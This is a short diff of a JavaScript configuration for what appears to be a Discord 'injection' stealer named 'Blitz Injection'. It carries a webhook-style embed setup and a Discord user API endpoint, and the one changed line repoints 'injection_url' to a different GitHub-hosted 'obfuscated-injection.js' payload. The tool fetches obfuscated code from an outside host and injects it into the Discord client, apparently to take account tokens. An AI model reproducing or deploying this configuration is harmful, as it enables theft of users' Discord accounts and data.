@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Blitz Injection', 
   embed_icon: 'https://cdn.discordapp.com/avatars/1089057920865550386/311b0a7fd44a057f62ab9eca8bdc74fc.webp?size=4096'.replace(/ /g, '%20'),
   embed_color: 0000000, 
-  injection_url: 'https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/zvkro/injection/main/obfuscated-injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
